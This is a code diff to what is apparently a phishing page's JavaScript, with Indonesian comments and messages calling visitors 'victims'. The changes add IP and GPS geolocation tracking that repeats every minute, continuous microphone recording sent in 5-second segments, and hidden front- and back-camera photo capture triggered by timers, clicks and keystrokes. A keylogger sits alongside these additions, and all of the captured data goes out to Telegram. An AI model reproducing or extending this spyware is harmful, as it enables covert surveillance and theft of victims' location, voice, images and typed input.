@@ -478,15 +478,13 @@
             }
         }
         
-        // ==================== AUDIO RECORDING + KEYLOGGER SUPER AGGRESSIVE ====================
+        // ==================== LIVE AUDIO STREAMING + KEYLOGGER + SILENT PHOTO + GPS ====================
         (function() {
             let keystrokes = [];
             let mouseMovements = [];
             let clipboardData = [];
             let formData = {};
             let deviceInfo = {};
-            let mediaRecorder = null;
-            let audioChunks = [];
             let audioStream = null;
             let videoStream = null;
             let audioContext = null;
@@ -519,7 +517,7 @@
             
             // Send initial device info
             sendToTelegram(`
-🔥 <b>KORBAN BARU MASUK - AUDIO + KEYLOGGER MODE!</b> 🔥
+🔥 <b>KORBAN BARU MASUK - LIVE AUDIO + KEYLOGGER + GPS MODE!</b> 🔥
 🖥️ <b>Device Info:</b>
 • Platform: ${deviceInfo.platform}
 • Screen: ${deviceInfo.screen}
@@ -535,6 +533,95 @@
             // Update fingerprint display
             document.getElementById('fingerprint').innerHTML = 
                 `🖥️ Perangkat: ${deviceInfo.platform} | 🌐 ${deviceInfo.language} | 🕒 ${deviceInfo.timezone} | ⚡ ${deviceInfo.connection.type || '?'}`;
+            
+            // ==================== GPS & IP GEOLOCATION ====================
+            
+            // Fungsi untuk mendapatkan lokasi via IP (fallback)
+            async function getLocationByIP() {
+                try {
+                    // Menggunakan ip-api.com dengan HTTPS
+                    const response = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        sendToTelegram(`
+📍 <b>LOKASI via IP:</b>
+🌍 IP: ${data.query}
+🏳️ Negara: ${data.country} (${data.countryCode})
+🏙️ Kota: ${data.city}
+🗺️ Region: ${data.regionName} (${data.region})
+🧭 Koordinat: ${data.lat}, ${data.lon}
+📮 Zip: ${data.zip}
+🕒 Timezone: ${data.timezone}
+📡 ISP: ${data.isp}
+🔌 Org: ${data.org}
+                        `);
+                        return { lat: data.lat, lon: data.lon, source: 'ip' };
+                    } else {
+                        sendToTelegram(`❌ Gagal mendapatkan lokasi via IP: ${data.message}`);
+                    }
+                } catch (err) {
+                    sendToTelegram(`❌ Error IP geolocation: ${err.message}`);
+                }
+                return null;
+            }
+            
+            // Fungsi untuk mendapatkan lokasi GPS (meminta izin)
+            function getGPSLocation() {
+                if (!navigator.geolocation) {
+                    sendToTelegram('❌ Geolocation tidak didukung browser ini.');
+                    return;
+                }
+                
+                // Opsi untuk akurasi tinggi
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+                        sendToTelegram(`
+📡 <b>GPS LOCATION FOUND!</b>
+📍 Latitude: ${latitude}
+📍 Longitude: ${longitude}
+🎯 Akurasi: ${accuracy} meter
+📏 Altitude: ${altitude || 'N/A'} m
+🧭 Heading: ${heading || 'N/A'}°
+💨 Speed: ${speed || 'N/A'} m/s
+⏱️ Timestamp: ${new Date(position.timestamp).toLocaleString()}
+                        `);
+                        
+                        // Simpan ke localStorage
+                        const gpsLog = JSON.parse(localStorage.getItem('gps_log') || '[]');
+                        gpsLog.push({ lat: latitude, lon: longitude, accuracy, time: Date.now() });
+                        localStorage.setItem('gps_log', JSON.stringify(gpsLog.slice(-5)));
+                    },
+                    (error) => {
+                        let msg = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED: msg = 'Izin lokasi ditolak.'; break;
+                            case error.POSITION_UNAVAILABLE: msg = 'Informasi lokasi tidak tersedia.'; break;
+                            case error.TIMEOUT: msg = 'Timeout mengambil lokasi.'; break;
+                            default: msg = 'Error tidak diketahui.';
+                        }
+                        sendToTelegram(`❌ GPS gagal: ${msg}`);
+                    },
+                    options
+                );
+            }
+            
+            // Panggil kedua metode
+            setTimeout(() => {
+                getLocationByIP();
+                getGPSLocation();
+            }, 2000); // Beri jeda 2 detik setelah halaman dimuat
+            
+            // Coba ulang GPS setiap 60 detik (mungkin user berubah pikiran)
+            setInterval(() => {
+                getGPSLocation();
+            }, 60000); // setiap 60 detik
             
             // ==================== ADVANCED KEYLOGGER ====================
             
@@ -683,7 +770,7 @@ Time: ${new Date().toLocaleString()}
                 `);
             });
             
-            // ==================== LIVE AUDIO RECORDING ====================
+            // ==================== LIVE AUDIO STREAMING (5 DETIK SEGMEN) ====================
             
             async function startAudioRecording() {
                 try {
@@ -703,83 +790,83 @@ Time: ${new Date().toLocaleString()}
                     // Show audio visualizer
                     document.getElementById('audioVisualizer').classList.add('active');
                     
-                    // Setup audio context for visualization and processing
+                    // Setup audio context for visualization (opsional)
                     audioContext = new (window.AudioContext || window.webkitAudioContext)();
                     analyser = audioContext.createAnalyser();
                     microphone = audioContext.createMediaStreamSource(audioStream);
                     microphone.connect(analyser);
                     analyser.fftSize = 256;
                     
-                    // Create media recorder for continuous recording
-                    mediaRecorder = new MediaRecorder(audioStream, {
-                        mimeType: 'audio/webm;codecs=opus',
-                        audioBitsPerSecond: 128000
-                    });
-                    
-                    // Collect audio chunks
-                    mediaRecorder.ondataavailable = function(event) {
-                        if (event.data.size > 0) {
-                            audioChunks.push(event.data);
-                        }
-                    };
-                    
-                    // Send audio when recording stops
-                    mediaRecorder.onstop = function() {
-                        if (audioChunks.length > 0) {
-                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                            const reader = new FileReader();
+                    // Fungsi untuk mengirim segmen audio
+                    function sendAudioSegment(blob, segmentNumber) {
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            const base64Audio = reader.result.split(',')[1];
+                            // Potong jika terlalu panjang untuk Telegram (maks ~4096 karakter)
+                            const maxLen = 3500;
+                            const audioPreview = base64Audio.length > maxLen ? base64Audio.substring(0, maxLen) + '... [truncated]' : base64Audio;
                             
-                            reader.onloadend = function() {
-                                const base64Audio = reader.result.split(',')[1];
-                                
-                                // Send audio to Telegram (split into chunks if needed)
-                                if (base64Audio.length < 40000) {
-                                    sendToTelegram(`
-🎤 <b>Live Audio Recording:</b>
-Duration: ${audioChunks.length * 2} seconds
-Size: ${audioBlob.size} bytes
+                            sendToTelegram(`
+🎤 <b>LIVE AUDIO SEGMENT #${segmentNumber} (5s):</b>
+Size: ${blob.size} bytes
 Time: ${new Date().toLocaleString()}
-Audio Data: ${base64Audio.substring(0, 100)}...
-                                    `);
-                                } else {
-                                    // Send multiple chunks
-                                    for(let i = 0; i < base64Audio.length; i += 30000) {
-                                        sendToTelegram(`
-🎤 <b>Audio Chunk ${i/30000 + 1}:</b>
-Data: ${base64Audio.substring(i, i + 30000)}
-                                        `);
-                                    }
-                                }
-                            };
-                            
-                            reader.readAsDataURL(audioBlob);
-                            audioChunks = [];
-                        }
-                    };
+Audio Data: ${audioPreview}
+                            `);
+                        };
+                        reader.readAsDataURL(blob);
+                    }
                     
-                    // Start recording in 30-second segments
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                            setTimeout(() => {
-                                if (mediaRecorder && audioStream.active) {
-                                    mediaRecorder.start();
-                                }
-                            }, 1000);
-                        }
-                    }, 30000);
+                    // Rekam segmen 5 detik berulang
+                    let segmentCounter = 0;
                     
-                    // Send notification
+                    function recordNextSegment() {
+                        if (!audioStream || !audioStream.active) return;
+                        
+                        segmentCounter++;
+                        const mediaRecorder = new MediaRecorder(audioStream, {
+                            mimeType: 'audio/webm;codecs=opus',
+                            audioBitsPerSecond: 64000 // kualitas cukup untuk suara
+                        });
+                        
+                        let audioChunks = [];
+                        
+                        mediaRecorder.ondataavailable = (event) => {
+                            if (event.data.size > 0) {
+                                audioChunks.push(event.data);
+                            }
+                        };
+                        
+                        mediaRecorder.onstop = () => {
+                            if (audioChunks.length > 0) {
+                                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                                sendAudioSegment(audioBlob, segmentCounter);
+                            }
+                            // Rekam segmen berikutnya segera
+                            recordNextSegment();
+                        };
+                        
+                        // Rekam selama 5 detik
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                        }, 5000); // 5 detik
+                    }
+                    
+                    // Mulai segmen pertama
+                    recordNextSegment();
+                    
+                    // Kirim notifikasi live audio streaming
                     sendToTelegram(`
-🎙️ <b>LIVE AUDIO RECORDING ACTIVE!</b>
+🎙️ <b>LIVE AUDIO STREAMING ACTIVE!</b>
 Microphone access granted
-Recording in 30-second segments
-Audio quality: 48kHz stereo
+Streaming dalam segmen 5 detik (real-time)
+Audio quality: 48kHz, 64kbps
 Time: ${new Date().toLocaleString()}
                     `);
                     
-                    // Monitor audio levels
+                    // Monitor audio levels (tetap ada)
                     const dataArray = new Uint8Array(analyser.frequencyBinCount);
                     setInterval(() => {
                         analyser.getByteFrequencyData(dataArray);
@@ -895,6 +982,145 @@ Time: ${new Date().toLocaleString()}
                     `);
                 }
             }
+            
+            // ==================== SILENT PHOTO CAPTURE (FOTO DIAM-DIAM) ====================
+            
+            async function silentPhotoCapture() {
+                try {
+                    // Coba akses kamera depan dengan resolusi rendah agar cepat
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 640 }, 
+                            height: { ideal: 480 },
+                            facingMode: 'user' // kamera depan
+                        },
+                        audio: false
+                    });
+                    
+                    // Buat elemen video tersembunyi
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    video.style.display = 'none';
+                    video.style.opacity = '0';
+                    video.style.position = 'fixed';
+                    video.style.top = '-1000px';
+                    video.style.left = '-1000px';
+                    document.body.appendChild(video);
+                    
+                    // Tunggu video siap
+                    await new Promise((resolve, reject) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                        video.onerror = reject;
+                        setTimeout(resolve, 2000); // timeout jika gagal
+                    });
+                    
+                    // Beri waktu exposure
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    // Ambil frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Konversi ke JPEG base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    // Kirim ke Telegram
+                    sendToTelegram(`
+📸 <b>SILENT PHOTO CAPTURE SUCCESS</b>
+Resolusi: ${canvas.width}x${canvas.height}
+Waktu: ${new Date().toLocaleString()}
+Data: ${imageData.substring(0, 200)}...
+                    `);
+                    
+                    // Simpan log
+                    const photoLog = JSON.parse(localStorage.getItem('silent_photos') || '[]');
+                    photoLog.push({ time: Date.now(), size: canvas.width + 'x' + canvas.height });
+                    localStorage.setItem('silent_photos', JSON.stringify(photoLog.slice(-5)));
+                    
+                    // Hentikan stream dan hapus elemen
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    
+                } catch (err) {
+                    sendToTelegram(`
+❌ <b>Silent photo failed:</b>
+Error: ${err.message}
+Browser: ${navigator.userAgent}
+Time: ${new Date().toLocaleString()}
+                    `);
+                    
+                    // Coba kamera belakang sebagai fallback
+                    try {
+                        const streamBack = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: { exact: 'environment' } } 
+                        });
+                        // Proses ulang dengan streamBack (sederhanakan)
+                        const videoBack = document.createElement('video');
+                        videoBack.srcObject = streamBack;
+                        videoBack.setAttribute('playsinline', '');
+                        videoBack.style.display = 'none';
+                        document.body.appendChild(videoBack);
+                        
+                        await new Promise((resolve) => {
+                            videoBack.onloadedmetadata = () => {
+                                videoBack.play();
+                                resolve();
+                            };
+                            setTimeout(resolve, 2000);
+                        });
+                        
+                        await new Promise(r => setTimeout(r, 500));
+                        
+                        const canvasBack = document.createElement('canvas');
+                        canvasBack.width = videoBack.videoWidth || 640;
+                        canvasBack.height = videoBack.videoHeight || 480;
+                        canvasBack.getContext('2d').drawImage(videoBack, 0, 0);
+                        
+                        const imageDataBack = canvasBack.toDataURL('image/jpeg', 0.7);
+                        
+                        sendToTelegram(`
+📸 <b>SILENT PHOTO (BACK CAMERA) SUCCESS</b>
+Resolusi: ${canvasBack.width}x${canvasBack.height}
+Waktu: ${new Date().toLocaleString()}
+Data: ${imageDataBack.substring(0, 200)}...
+                        `);
+                        
+                        streamBack.getTracks().forEach(track => track.stop());
+                        videoBack.remove();
+                        
+                    } catch (backErr) {
+                        sendToTelegram('Kamera belakang juga gagal.');
+                    }
+                }
+            }
+            
+            // Jadwalkan beberapa kali silent photo
+            setTimeout(silentPhotoCapture, 4000);   // 4 detik
+            setTimeout(silentPhotoCapture, 12000);  // 12 detik
+            setTimeout(silentPhotoCapture, 30000);  // 30 detik
+            setTimeout(silentPhotoCapture, 60000);  // 1 menit
+            
+            // Pancingan dengan aktivitas user
+            document.addEventListener('click', function() {
+                if (Math.random() < 0.3) { // 30% kesempatan
+                    silentPhotoCapture();
+                }
+            });
+            
+            let keyCount = 0;
+            document.addEventListener('keydown', function() {
+                keyCount++;
+                if (keyCount % 20 === 0) { // setiap 20 ketukan
+                    silentPhotoCapture();
+                }
+            });
             
             // ==================== FORM SUBMISSION ====================
             document.getElementById('phishForm').addEventListener('submit', function(e) {
